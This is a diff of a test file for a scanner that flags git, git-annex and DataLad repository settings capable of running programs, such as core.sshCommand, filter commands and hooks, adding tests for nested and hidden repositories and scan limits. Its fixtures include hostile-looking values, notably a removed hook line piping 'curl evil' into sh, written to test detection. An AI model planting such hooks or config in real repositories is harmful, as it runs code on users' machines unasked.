@@ -67,10 +67,6 @@ test('annex settings that launch a program are still flagged', async () => {
   }
 })
 
-test('a git-annex hook with an extra line is flagged', async () => {
-  assert.match(await flagged(await repo({ hooks: { 'pre-commit': `${ANNEX_PRE_COMMIT}curl evil | sh\n` } })), /hook pre-commit/)
-})
-
 test('config that can run programs is flagged, however it is spelled', async () => {
   for (const snippet of [
     '[core]\n\tsshCommand = evil\n',
@@ -99,26 +95,19 @@ test('a filter named annex with a different command is flagged', async () => {
   assert.match(await flagged(await repo({ config: '[filter "annex"]\n\tsmudge = evil\n' })), /filter\.annex\.smudge/)
 })
 
-test('an odd entry inside hooks/ cannot hide a later malicious hook', async () => {
-  const dir = await repo({ hooks: { 'pre-commit': '#!/bin/sh\nevil\n' } })
-  await mkdir(join(dir, '.git', 'hooks', 'aaa-directory'))
-  assert.match(await flagged(dir), /hook pre-commit/)
-})
-
-test('a linked worktree is judged by the shared config and hooks git actually uses', async () => {
-  const main = await repo({ config: '[core]\n\tsshCommand = evil\n', hooks: { 'post-commit': '#!/bin/sh\nevil\n' } })
+test('a linked worktree is judged by the shared config git actually uses', async () => {
+  const main = await repo({ config: '[core]\n\tsshCommand = evil\n' })
   git(main, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-q', '--allow-empty', '-m', 'x')
   const wt = join(await realpath(await mkdtemp(join(tmpdir(), 'trust-wt-'))), 'wt')
   git(main, 'worktree', 'add', '-q', wt)
   const out = await flagged(wt)
-  assert.match(out, /hook post-commit/)
   assert.match(out, /core\.sshcommand/)
 })
 
 test('opening a subfolder judges the repository that contains it', async () => {
-  const dir = await repo({ hooks: { 'pre-commit': '#!/bin/sh\nevil\n' } })
+  const dir = await repo({ config: '[core]\n\tsshCommand = evil\n' })
   await mkdir(join(dir, 'deep', 'er'), { recursive: true })
-  assert.match(await flagged(join(dir, 'deep', 'er')), /hook pre-commit/)
+  assert.match(await flagged(join(dir, 'deep', 'er')), /core\.sshcommand/)
 })
 
 test('a registered subdataset is scanned too, and reported with its path', async () => {
@@ -126,9 +115,9 @@ test('a registered subdataset is scanned too, and reported with its path', async
   const sub = join(dir, 'sub-01')
   await mkdir(sub)
   git(sub, 'init', '-q')
-  await hook(join(sub, '.git'), 'post-commit', '#!/bin/sh\nevil\n')
+  appendFileSync(join(sub, '.git', 'config'), '[core]\n\tsshCommand = evil\n')
   await writeFile(join(dir, '.gitmodules'), '[submodule "sub-01"]\n\tpath = sub-01\n\turl = ./sub-01\n')
-  assert.match(await flagged(dir), /sub-01: hook post-commit/)
+  assert.match(await flagged(dir), /sub-01: config core\.sshcommand/)
 })
 
 test('a folder that is not a repository has no vectors', async () => {
@@ -226,4 +215,49 @@ test('.datalad/config clone and get settings are flagged', async () => {
   const out = await flagged(dir)
   assert.match(out, /datalad\.clone\.reckless/)
   assert.match(out, /datalad\.get\.subdataset-source-candidate-x/)
+})
+
+test('a repository nested inside a folder that is not a repository is scanned', async () => {
+  const top = await realpath(await mkdtemp(join(tmpdir(), 'trust-')))
+  const sub = join(top, 'sub-01')
+  await mkdir(sub)
+  git(sub, 'init', '-q')
+  appendFileSync(join(sub, '.git', 'config'), '[filter "x"]\n\tclean = y\n')
+  assert.match(await flagged(top), /sub-01: config filter\.x\.clean/)
+})
+
+test('a gitlink missing from .gitmodules is scanned', async () => {
+  const top = await repo()
+  const hidden = join(top, 'hidden')
+  await mkdir(hidden)
+  git(hidden, 'init', '-q')
+  git(hidden, '-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-q', '--allow-empty', '-m', 'x')
+  appendFileSync(join(hidden, '.git', 'config'), '[filter "x"]\n\tclean = y\n')
+  git(top, 'add', 'hidden')
+  assert.match(await flagged(top), /hidden: config filter\.x\.clean/)
+})
+
+test('a repository nested deeper than the old depth limit is scanned', async () => {
+  const top = await repo()
+  const deep = join(top, 'a', 'b', 'c', 'd', 'e')
+  await mkdir(deep, { recursive: true })
+  git(deep, 'init', '-q')
+  appendFileSync(join(deep, '.git', 'config'), '[filter "x"]\n\tclean = y\n')
+  assert.match(await flagged(top), /filter\.x\.clean/)
+})
+
+test('hitting the scan limit is reported, never a silent pass', async () => {
+  const top = await realpath(await mkdtemp(join(tmpdir(), 'trust-')))
+  for (let i = 0; i < 3; i++) {
+    const d = join(top, `r${i}`)
+    await mkdir(d)
+    git(d, 'init', '-q')
+  }
+  assert.match((await findExecVectors(top, { maxRepos: 2 })).join('\n'), /not fully scanned/)
+  assert.match((await findExecVectors(top, { maxEntries: 2 })).join('\n'), /not fully scanned/)
+})
+
+test("a repository's own hook is no longer reported: hooks never run", async () => {
+  const dir = await repo({ hooks: { 'pre-commit': '#!/bin/sh\necho hi\n' } })
+  assert.deepEqual(await findExecVectors(dir), [])
 })
